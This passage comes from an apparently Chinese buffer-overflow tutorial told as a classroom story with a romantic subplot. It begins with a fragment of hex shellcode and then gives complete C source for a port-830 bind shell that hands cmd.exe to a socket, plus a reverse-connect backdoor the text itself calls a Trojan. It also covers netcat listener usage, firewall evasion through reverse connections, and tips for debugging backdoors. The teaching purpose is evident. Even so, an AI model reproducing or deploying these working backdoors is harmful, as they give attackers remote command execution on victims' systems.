    "\x8D\x3C\x24\xB8\x01\x01\x00\x00\x89\x47\x2C\x8B\x45\x40\x89\x47"
    "\x38\x8B\x45\x3C\x89\x47\x3C\x8B\x45\x3C\x89\x47\x40\xB8\x63\x6D"
    "\x64\x00\x89\x47\x64\x8D\x44\x24\x44\x50\x57\x51\x51\x51\x41\x51"
    "\x49\x51\x51\x8D\x47\x64\x50\x51\xFF\x55\x08\x81\xEC\x00\x04\x00"
    "\x00\x8B\xF4\x33\xC9\x51\x51\x8D\x7D\x48\x57\xB8\x00\x04\x00\x00"
    "\x50\x56\x8B\x45\x38\x50\xFF\x55\x0C\x8B\x07\x85\xC0\x74\x19\x33"
    "\xC9\x51\x57\xFF\x37\x56\xFF\x75\x38\xFF\x55\x14\x33\xC9\x51\xFF"
    "\x37\x56\x53\xFF\x55\x30\xEB\xC3\x33\xC9\x51\xB8\x00\x04\x00\x00"
    "\x50\x56\x53\xFF\x55\x34\x89\x07\x33\xC9\x51\x57\xFF\x37\x56\xFF"
    "\x75\x44\xFF\x55\x10\xEB\xA4"; 
```

# 3.5 进一步的探讨

## 3.5 进一步的探讨

宇强不服气的说：“写字速度是我的弱项，我们比比其他方面的吧！”

“以后有机会的。现在时间不早了，我们再进行点后门编写更高级的讨论吧！”老师说。

“哦！那好吧！”

# 3.5.1 更简单的办法——零管道后门

### 3.5.1 更简单的办法——零管道后门

“我们讲了双管道后门、单管道后门，其实还可以有不用新建管道的后门——零管道后门！”老师说道。

“啊?不用管道？那进程间怎么通信呢？”

“不是不用管道，”老师纠正道，“而是不用新建管道。”

“哦？”大家疑惑不解。

“其实是这样的，我们用 Socket 句柄直接替代 CMD 进程的输入和输出句柄，就像这样：”

```
si.hStdInput = si.hStdOutput = si.hStdError = (void *)clientFD; 
```

“哦？还可以这样啊！”大家一愣。

“对，这样替换后 CMD 的输入输出就可以直接和远程通信了，省去了进程间传输的所有东西。”

“啊？”

“我们来看看实现，”老师还提醒了一句，“但要注意，要用 WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0) 来建立 Socket 才能像这样替换。因为 WSASocket()创建的 Socket 默认是非重叠套接字，这样才可以直接将 cmd.exe 的 stdin、stdout、stderr 转向到套接字。而 socket()函数创建的 Socket 是重叠套接字，就不能这样。”

“组合起来，得到我们的零管道程序‘pipe0.cpp’，如下：”

```
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")
int main()
{
         WSADATA ws;
         SOCKET listenFD;
         int ret;
         //初始化 wsa
         WSAStartup(MAKEWORD(2,2),&ws);
         //注意要用 WSASocket
         listenFD = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
         //监听本机 830 端口
         struct sockaddr_in server;
         server.sin_family = AF_INET;
         server.sin_port = htons(830);
         server.sin_addr.s_addr=ADDR_ANY;
ret=bind(listenFD,(sockaddr *)&server,sizeof(server));
         ret=listen(listenFD,2);
         //如果客户请求 830 端口，接受连接
         int iAddrSize = sizeof(server);
         SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);
         STARTUPINFO si;
         ZeroMemory(&si,sizeof(si));
         si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
         si.wShowWindow = SW_HIDE;
         si.wShowWindow = SW_SHOWNORMAL;
         si.hStdInput = si.hStdOutput = si.hStdError = (void *)clientFD;
         char cmdLine[] = "cmd.exe";
         PROCESS_INFORMATION ProcessInformation;
         //建立进程 
  ret=CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
         return 0;
} 
```

“哇！好简短啊！”小倩说道。

“我们测试一下，运行，打开了 830 端口，而且可以登陆交互，如图 3－34。”

![](img/Q 版缓冲区溢出教程 106611.jpg)

“呀！这么简单的后门，写起来多容易啊！”

“是啊！这么好的方法怎么不早说呢？我们就不用写双管道和单管道了。”大家说。

“NO，”老师纠正道，“这三种开端口后门的办法，各有优劣。零管道编写方法的确比较方便，但用户一输入命令就直接进入 CMD 进程执行了。有时我们想预先处理一下用户的命令，就需要用双管道或单管道的方法。”

“哦？”

“比如，我们可以在后门中加入列举进程的命令——pslist。CMD 里是没有这些命令的，所以我们就需要先判断用户传过来的是 pslist，然后在程序里面实现列举进程的功能，而不是传给 CMD 进程执行。”

“真是尺有所短，寸有所长啊！”同学们感叹道。

“说的好，就是这样的！”

# 3.5.2 正向连接和反向连接

### 3.5.2 正向连接和反向连接

老师说，“好累啊，本来还要讲反连后门的编写的，看来时间来不及了。大家下去讨论一下如何实现吧！”

“反连后门？是什么？”玉波问道。

“刚才的程序是目标机作为服务端，监听 830 端口；攻击机作为客户端，正向连接目标机的 830 端口，其示意图如图 3－35。”

![](img/Q 版缓冲区溢出教程 107063.jpg)

“但如果目标机开启了防火墙，这种方法就不行了。目标机的防火墙会阻断对非法端口的连接，如图 3－36。”

![](img/Q 版缓冲区溢出教程 107117.jpg)

“哦，那怎么办呢？”

“所以我们要使用反向连接。”老师说道。“其示意图如图 3－37。”

![](img/Q 版缓冲区溢出教程 107165.jpg)

“反向连接是把攻击机作为服务端，监听一个端口；而目标机上运行的 ShellCode 的功能是主动连接攻击机监听的端口。一般的防火墙（特别是硬件防火墙）不会阻断内往外的连接，所以很多情况下是可以成功的。”

“哦！”

“而软件防火墙，有的可能会弹出一个对话框，询问是否允许往外连接，如果用户点击了不允许，那也不能成功。”

“还是不能完全成功啊？”大家遗憾的说。

“要突破那样的防火墙，需要用到更高级的 ShellCode 编程，我们以后再说。这里布置一个课后作业，实现并提取一个简单反连后门的 ShellCode，大家还是以刚才的分组进行操作。”

“啊？编写思路都还没有呢。”

“那我提示一下，这个 ShellCode 的功能是作为客户端，主动连接我们攻击机的一个端口。剩下的传输命令、执行命令，返回结果和前面类似。攻击机上开端口不用编程，用程序 NC 来开。”

“NC 是什么？”玉波问道。

“NC 是什么，大家去网上查查吧！这样可以锻炼你们解决问题的能力。明白了吗？”

“大家把讨论结果用 E-mail 发给我，这将作为一次平时作业的成绩。今天到此结束！下课！ByeBye！”

# 3.6 反连后门 ShellCode 的编写

## 3.6 反连后门 ShellCode 的编写

宇强回来后，找出记录小倩电话的纸，犹豫了半天，终于鼓起勇气拨出了号码。电话响了两声后，一个声音传来：“请问你找谁？”

“嗯……”宇强愣了一下，“请问小倩在吗？”

“在，你等等……”

哦，原来是她同学啊！

过了一会，小倩的声音从电话里传来。“喂！谁啊？”

“是我，今天和你一组讨论的宇强。”

“哦，是你啊，有什么事吗？”小倩问道。

宇强连忙解释：“老师不是布置作业了吗？你什么时候有空，我们一起讨论一下吧！然后作为平时的作业交上去。”

“好啊！”小倩笑了，“周末我要回家，那三十号上午吧！我没课。”

“哦，就是明天呀！好啊，我也没课，那明天 10 点钟我来找你吧！”

“好吧，再见！”

宇强放下电话非常高兴，忙着准备思路和实际测试。

# 3.6.1 总体思路和实现

### 3.6.1 总体思路和实现

第二天宇强按时拨通了小倩寝室的电话，这次是小倩自己接的。

“你好啊！我是宇强。我现在你们寝室下面。”

“好，你等一会儿，我马上下来。”

过了几分钟，小倩穿了件淡蓝色的外套，背着白色书包出现在了门口。宇强暗自惊叹，“好漂亮啊！”

宇强与小倩一行走在去三教的路上。在路上他们边走边聊。

在去第三教学楼的路上，要经过一个篮球场。宇强往里面望了望，好多人呀，有打篮球的、有练习排球的、也有打羽毛球的……他们沐浴在温暖的阳光中。

在教学楼门前，宇强看见了一对老人相互搀扶着散步，头发早已花白。虽然步履蹒跚，但他们的面容非常安详，两人在一起显得是多么的自然、谐。

宇强也不禁心里一动，“和我执子之手，与之偕老的人又在哪儿呢？

……

到三教后发现上自习的人很少，教室里只有三两个人。

小倩看了几个教室，小声说道：“怎么办？教室里都有人，说话打扰别人也不好啊！”

宇强眼睛一转，说：“去教师休息室吧！课间同学们都在那儿问老师问题，我们可以去那里讨论。”

“好主意！”小倩赞同的说道。

教室休息室里摆放着桌几、椅子，还有开水，以供老师在课间休息时饮用。条件还不错！

两人坐下后，宇强说道：“其实老师已经提示很多了，我们理一下思路，就可以把它实现。”

“哦？你这么厉害。”小倩说，“我查了一下老师说的 NC。任何计算机都可以用 NC 直接监听端口，用法是 nc －l －p port 。如果有别的计算机连接这个端口，也可以得到一个 Shell。”

小知识：黑客的瑞士军刀——NC

常用的用法：输入-h 可以得到帮助信息

-e prog 程序重定向，一旦连接，就执行

-i secs 延时的间隔

-l 监听模式，用于入站连接

-n 指定数字的 IP 地址，不能用 hostname

-o file 记录 16 进制的传输

-p port 本地端口号

-r 任意指定本地及远程端口

-s addr 本地源地址

-u UDP 模式

-v 详细输出——用两个-v 可得到更详细的内容

-w wait 超时的时间

-z 将输入输出关掉——用于扫描时

“对！” 宇强说道，“那我们在攻击机上用 nc –l –p 830 监听 830 端口，而在目标机上运行 ShellCode，其功能是主动连接我们攻击机的 IP 和 830 端口来接收命令。这就是反连的意思。”

“嗯，思路应该就是这样！”小倩说道。

“网络传输部分和正向类似，只不过 ShellCode 是客户端，流程应该是：”

socket()→connet(攻击机 ip，端口)→send/recv()→closesocket()

“实现也比较简单，像下面这样。” 宇强边说边写。

```
WSAStartup(MAKEWORD(2,2),&ws);
WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
connect(s,(struct sockaddr *)&server,sizeof(server) ); 
```

“和 CMD 子进程连接也是一样的，或者用一个管道，或者用两个管道，或者不用管道，直接用 Socket 句柄来代替。” 宇强继续说，“就像下面这样：”

```
//CMD 的输入输出句柄，都用 Socket 来替换
si.hStdInput = si.hStdOutput = si.hStdError = (void *)s;
//建立进程    
ret=CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation); 
```

“把它们合起来就可以了吧？”小倩说。

“是啊，我们可以得到反向连接的程序（BackC.cpp），如下：”

```
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")
int main()
{
     WSADATA ws;
     SOCKET s;
     int ret;
     //初始化 wsa
     WSAStartup(MAKEWORD(2,2),&ws);
     //建立 Socket
     s=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     //连接对方 830 端口
     struct sockaddr_in server;
     server.sin_family = AF_INET;
     server.sin_port = htons(830);
     server.sin_addr.s_addr=inet_addr("127.0.0.1");
     //反向连接！
     connect(s,(struct sockaddr *)&server,sizeof(server) ); 
     STARTUPINFO si;
     ZeroMemory(&si,sizeof(si));
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
     si.wShowWindow = SW_HIDE;
     //CMD 的输入输出句柄，都用 Socket 来替换
     si.hStdInput = si.hStdOutput = si.hStdError = (void *)s;
     char cmdLine[] = "cmd.exe";
     PROCESS_INFORMATION ProcessInformation;
     //建立进程    
     ret=CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
      return 0;
} 
```

“哇，很清晰的思路嘛！”

宇强听后暗自狂喜，心想总算没有白熬至深夜两点。

“好，如果测试的话，就先执行 nc –l –p 830 来监听，然后运行程序 backC.cpp。如果一切正常，就应该如图 3－38 所示，NC 得到了一个 shell。” 宇强说。

![](img/Q 版缓冲区溢出教程 110768.jpg)

“剩下就是转换成汇编和 ShellCode 了。”

“这个可是苦力活啊……”小倩吐了吐舌头。

“那这样吧，我周末回家的时候生成 BackAsm.cpp 和 BackShellCode.cpp 发给老师，也帮你发一份。”

“好啊！就麻烦你了。”小倩说。

“那里，客气了。” 宇强心里高兴极了。

“这个也应该算是个木马吧？”小倩问道。

“是啊，一个简单的特洛依木马。”

“哦！特洛依木马？现在正在放《特洛依》电影呢！”小倩说，“听说很好看的，程序这件事挺麻烦你的，我请你看电影吧！”

“啊？那怎么行！” 宇强赶紧推辞。

“哎哟！别争来争去了，那我们就 AA 吧！”

“嗯，行！”

# 3.6.2 从神话到史诗——《特洛依》

### 3.6.2 从神话到史诗——《特洛依》

《特洛依》的场影拍得很有气势！

电影放映到中场时，宇强说：“刚才电影里的那个‘特洛依’看来属于反连后门哦！”

“呵呵，”小倩被逗乐了，“是刚才我们写的那种吗？”

宇强挠了挠头，说道：“不过好像也是正连后门，主动开的城门——端口，让希腊人（攻击端）连接。”

“哈哈！”小倩更乐了。

……

电影完毕，宇强送小倩回寝室。至楼下时，宇强说：“我把手机号给你吧，有什么事情好联系！”

“好的，我记下了，不过我现在还没有手机，可能会回家买！”

“好的，周末愉快！再见！”

“谢谢，你也是，byebye！”

# 课后解惑

## 课后解惑

Q：为什么要推广 Ipv6 呢？Ipv4 有什么缺点吗？

A： Ipv4 最大的缺点就是能分配的 IP 资源不足。除此之外，Ipv4 还存在一些安全上的缺陷，比如不鉴别源端的合法性等。

Q：讲了三种监听端口后面的实现方法，分别是双管道、单管道和零管道，究竟哪种方法最好呢？

A：兵无定势，水无常行。不存在最好的方法，只有最适合实际情况的方法。我认为最好的方法对你来说未必方便，很多事情都是这样的。不过，非要给答案的话，建议大家尽量考虑使用管道吧！因为 Winsock 建议使用像 Socket 的重接套接字。

Q：测试单管道后门程序时，我用 Telnet 登陆成功，但不能执行命令，比如敲入 dir 命令，结果显示“d 不是程序或命令，i 不是程序或命令，r 不是程序或命令”，真奇怪！

A：呵呵！因为 Telnet 的设计目的是最大限度的减少时延。所以它遵循的是用户刚输入字符就马上传送过去。这样你的 dir 命令就被分为 d、i、r 分别发送了。而单管道那面的实现，是一收到字符就执行，当然不能执行成功了。

Q：如果我要坚持用单管道后门，该怎么办？

A：一种方法是改进你的 ShellCode，不要刚收到命令就传给 CMD 子进程执行，而是先把命令存起来，收到回车后，才一起传给 CMD 子进程；

另一种方法是改进客户端，不用 Telnet，而使用 NC。NC 会等待用户输入命令，直到敲入回车以后才一起发送过去。当然，你也可以自己写一个登陆程序。

Q：有些后门程序执行也成功，登陆也成功。但想退出时，输入 exit 命令时程序就会死在那里，无论敲什么都退不出来，怎么回事？

A：不是 CMD 子进程退不出来，而是 CMD 子进程执行 exit 后都已经退出了。你无论再输入什么，子进程都不会有输出。但没有退出那个接收消息的循环，所以 ShellCode 就一直收命令，但什么也做不了。

解决方法：可以加个字符判断。如果接收的命令是 exit ，就退出 ShellCode 的循环。

Q：我按照书上的步骤测试，提取出 ShellCode，并在溢出程序中测试，但不能成功，为什么呢？我的环境是 XP SP2。

A：不能成功的原因有很多，本书后面会有详细的分析。但 XP SP2 加入了新的安全保护措施，你先换个系统测试吧！

Q：先写汇编，然后提取 ShellCode，感觉有点麻烦也……

A：一般的 ShellCode 功能比较少，代码也比较短，所以用汇编写，在熟之后，还是比较方便的。多练习一下就好了。

Q：那对功能要求比较多的 ShellCode，应如何方便的写呢？

A：也有简单的方法！我们可以用高级语言写代码，再直接提取成 ShellCode。但要经过一定处理，使其符合流程。我们将在高级 ShellCode 编写技巧中提到。